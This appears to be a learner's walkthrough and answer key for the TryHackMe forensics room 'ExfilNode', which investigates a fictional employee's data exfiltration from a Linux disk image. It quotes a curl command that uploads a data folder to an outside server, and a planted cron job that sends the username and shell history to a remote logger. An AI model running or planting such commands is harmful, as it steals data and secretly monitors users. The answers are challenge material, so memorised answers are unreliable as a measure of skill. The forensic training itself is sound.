
<p align="center">April 16, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{345}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="https://github.com/user-attachments/assets/818047b1-b60d-40b7-b5ca-a8c2213dae0b" alt="Your Image Badge"><br></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{ExfilNode}}$$</h1>
<p align="center">"Continue hunting for the exfiltration footprints in the ex-employee's personal workstation." <br>
It is classified as a medium-level CTF.<br>
It is a premium room: for subscribers only.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/exfilnode">here</a>.</p>


![image](https://github.com/user-attachments/assets/6aedc273-fadf-4bf4-a04b-45369d4354cc)


<br>
<br>

<h2>Task 1 . The End</h2>

<h3>Room Prerequisites</h3>

<p>.  <a href="https://tryhackme.com/room/linuxforensics/">Linux Forensics</a><br>
.  <a href="https://tryhackme.com/room/linuxincidentsurface">Linux Incident Surface</a><br>
.  <a href="https://tryhackme.com/room/linuxlogsinvestigations">Linux Logs Investigations</a><br>
.  <a href="https://tryhackme.com/room/extanalysis">EXT Analysis</a></p>

<br>

<p><code>Note</code>: Before we continue to dive into the scenario, it is important to note that this challenge is the continuation of the DiskFiltration room, where Liam's company-provided machine was being investigated in a data exfiltration case. While it is recommended to go through that room first to get a better understanding of the story's context, it's not mandatory. You can also solve this room independently and test your Linux investigation skills.</p>

<h3>Scenario</h3>

<p>The analysis of Liam's company-provided Windows workstation in the DiskFiltration room revealed major evidence of his involvement in the TECH THM's data exfiltration. However, he could argue that he was framed as he did not own the workstation. So, to uncover the whole truth and gather all the possible undeniable evidence, the investigators turned their attention to Liam's personal workstation (Linux machine), which was suspected to have played a key role in handling the exfiltrated data.<br>

As this was Liam's personal workstation, he had full control over covering his tracks more effectively. But was he careful enough? It seems like the investigators not only revealed more about the external entity Liam worked with but also exposed a betrayal: Liam was double-crossed.</p>

<h3>Starting the Machine</h3>
<p>Let’s start the virtual machine by pressing the Start Machine button below. The machine will start in split view.<br><br>
[Start Machine ]<br><br>
In case the VM is not visible, use the blue <code>Show Split</code> View button at the top of the page.

Liam's personal workstation's disk is mounted at <code>/mnt/liam_disk</code>, and the disk image is available at <code>/home/ubuntu</code>. You can run commands on the mounted disk.

Note: If you get the error </code>grep: /mnt/liam_disk/var/log/auth.log: binary file matches</code> with any log file, use <code>grep -a</code> which will treat the file as text. An example is given below:

<code>grep -i -a "string-pattern" /mnt/liam_disk/var/log/auth.log</code>

Additionally, you can utilize the Autopsy tool to assist with the analysis. However, Autopsy is optional. All the questions in this room can be answered by running commands on the mounted disk.

To use Autopsy, open a terminal and navigate to <code>/home/ubuntu/autopsy/autopsy-4.21.0/bin</code> and execute the command <code>./autopsy --nosplash</code> to execute it. The GUI of the tool will open. Now, select <code>Open Recent Case</code> from here and open the recent case named <code>Liam_Personal_Workstation</code> in which we have already imported the disk image. </p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

<br>

> 1.1. <em>When did Liam last logged into the system? (Format: YYYY-MM-DD HH:MM:SS).</em> Hint : <em>Focus on the graphical logins only.</em><br><a id='1.1'></a>
>> <strong><code>2025-02-28T10:59:07</code></strong><br>
<p></p>

<br>

![image](https://github.com/user-attachments/assets/c46db247-25b9-4129-8a18-210fd11c982a)

<br>


> 1.2. <em>What was the timezone of Liam’s device?</em><br><a id='1.2'></a>
>> <strong><code>America/Toronto</code></strong><br>
<p></p>

<br>

![image](https://github.com/user-attachments/assets/62b4e00f-4ad6-427f-af4c-da7b4703b3ac)


<br>

![image](https://github.com/user-attachments/assets/5093b1b4-2016-46c7-bc00-6faf42e5d51c)

<br>


> 1.3. <em>What is the serial number of the USB that was inserted by Liam?</em><br><a id='1.3'></a>
>> <strong><code>2651931097993496666</code></strong><br>
<p></p>

<br>

<p><code>ubuntu@tryhackme:/mnt/liam_disk/var/log$ grep -i "usb" syslog</code></p>

<br>

![image](https://github.com/user-attachments/assets/e1735841-527f-4cd2-a216-81765d4ee16a)


<br>


> 1.4. <em>When was the USB connected to the system? (Format: YYYY-MM-DD HH:MM:SS)</em><br><a id='1.4'></a>
>> <strong><code>2025-02-28T10:59:25</code></strong><br>
<p></p>

<br>

![image](https://github.com/user-attachments/assets/848c27f9-aa97-43f9-9e87-052f9d808d33)


<br>

> 1.5. <em>What command was executed when Liam ran 'transferfiles'?</em>Hint : <em>Liam was smart. He used a nickname for his long command. Where could have he placed this command?</em><br><a id='1.5'></a>
>> <strong><code>cp -r \"/media/liam/46E8E28DE8E27A97/Critical Data TECH THM\" /home/liam/Documents/Data</code></strong><br>
<p></p>

<br>

![image](https://github.com/user-attachments/assets/a509841c-96a6-477e-a5d3-985d28a860eb)

<br>


> 1.6. <em>What command did Liam execute to transfer the exfiltrated files to an external server?</em>Hint : <em>Liam was smart. He used a nickname for his long command. Where could have he placed this command?</em><br><a id='1.6'></a>
>> <strong><code>curl -X POST -d @/home/liam/Documents/Data http://tehc-thm.thm/upload</code></strong><br>
<p></p>

<br>

![image](https://github.com/user-attachments/assets/d2dba395-2af3-4e74-b407-3fd0c28067d1)

<br>

> 1.7. <em>What is the IP address of the domain to which Liam transferred the files to?</em><br><a id='1.7'></a>
>> <strong><code>5.45.102.93</code></strong><br>
<p></p>

<br>

![image](https://github.com/user-attachments/assets/a6e54a02-786c-4d5a-bc1c-e74e0aebf832)

<br>


![image](https://github.com/user-attachments/assets/dd185680-dfd8-43cf-b8cf-ca73b4d98159)



<br>


> 1.8. <em>Which directory was the user in when they created the file 'mth'?</em><br><a id='1.8'></a>
>> <strong><code>/home/liam</code></strong><br>
<p></p>

<br>

![image](https://github.com/user-attachments/assets/71465bfe-a60a-4978-86bb-3f4a23d5ad3a)


<br>

> 1.9. <em>Remember Henry, the external entity helping Liam during the exfiltration? What was the amount in USD that Henry had to give Liam for this exfiltration task?</em><br><a id='1.9'></a>
>> <strong><code>10000</code></strong><br>
<p></p>


<br>

![image](https://github.com/user-attachments/assets/1a75ed7f-bec9-4730-bf90-2df1533ffcb1)

<br>

> 1.10. <em>When was the USB disconnected by Liam? (Format: YYYY-MM-DD HH:MM:SS)</em><br><a id='1.10'></a>
>> <strong><code>2025-02-28T11:44:00</code></strong><br>
<p></p>

<br>

<p><code>ubuntu@tryhackme:/mnt/liam_disk/var/log$ grep -i "usb" syslog</code></p>

![image](https://github.com/user-attachments/assets/498349be-821e-484a-95c3-51e1a63a8099)


<br>

> 1.11. <em>There is a .hidden/ folder that Liam listed the contents of in his commands. What is the full path of this directory?</em><br><a id='1.11'></a>
>> <strong><code>/home/liam/Public</code></strong><br>
<p></p>

<br>

![image](https://github.com/user-attachments/assets/b9723798-599e-4ab6-bf3a-85c0a27b5916)


<br>

> 1.12. <em>Which files are likely timstomped in this .hidden/ directory (answer in alphabetical order, ascending, separated by a comma. e.g example1.txt,example2.txt)</em><br><a id='1.12'></a>
>> <strong><code>file3.txt,file7.txt</code></strong><br>
<p></p>

<br>

![image](https://github.com/user-attachments/assets/b2a31e80-ef4f-416a-9e6d-d1e29856a4ec)



<br>

![image](https://github.com/user-attachments/assets/68504009-f841-4107-aff2-c9768e672956)



<br>

> 1.13. <em>Liam thought the work was done, but the external entity had other plans. Which IP address was connected via SSH to Liam's machine a few hours after the exfiltration?</em><br><a id='1.13'></a>
>> <strong><code>94.102.51.15</code></strong><br>
<p></p>

<br>

![image](https://github.com/user-attachments/assets/e74bea5d-a226-4ccd-95c5-e4400b0b3d9e)

<br>


> 1.14. <em>Which cronjob did the external entity set up inside Liam’s machine?</em><br><a id='1.14'></a>
>> <strong><code>*/30 * * * * curl -s -X POST -d "$(whoami):$(tail -n 5 ~/.bash_history)" http://192.168.1.23/logger.php</code></strong><br>
<p></p>

<br>

<p>I di not find anything in <code>/etc/crontab</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/4abd4c49-9721-4ac4-89b0-fa5bb6ef22c3)

<br>
<br>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$</h1>
<br>
<p align="center">
<img width="900px" src="https://github.com/user-attachments/assets/7b21f7c3-aa22-4f32-9bfc-c74baf3bc344"><br>
<img width="900px" src="https://github.com/user-attachments/assets/8bab03cb-435f-46ac-b985-99613465420f"></p>

<br>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$ </h1>
<br>


<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |Global        | Brazil       | Global      | Brazil     |          | Completed |           |
| April 16, 2025    | 345      |     274ᵗʰ    |        6ᵗʰ   |    75ᵗʰ     |     2ⁿᵈ    |  95,043  |       670 |   59      |

</div>

<br>

<p align="center">Weekly League: Bronze 2ⁿᵈ<br><br><img width="300px" src="https://github.com/user-attachments/assets/ca5765a6-dec3-4d54-b477-c13c4098d6d41"> </p>


<br>


<p align="center"> Global All Time: 291ˢᵗ<br><br><img width="900px" src="https://github.com/user-attachments/assets/bdb72e2d-b564-4e5f-b1c4-1e6e5d00dfad"> </p>

<p align="center"> Brazil All Time:   6ᵗʰ<br><br><img width="900px" src=""> </p>

<p align="center"> Global monthly:  75ʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/82d25e23-509f-471c-9ea9-a2f79adca97b"> </p>

<p align="center"> Brazil monthly:   2ⁿᵈ<br><br><img width="900px" src="https://github.com/user-attachments/assets/a7022196-963f-4c65-b82d-0f63d1bd9b28"> </p>


<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thanks for coming!!!}}$$</h1>

<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 

<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thank you}}$$</h1>
<p align="center"><a href="https://tryhackme.com/p/Aashir.Masood">Aashir.Masood</a>  for investing your time and effort to develop this walkthrough so that I could sharpen my skills!</p> 
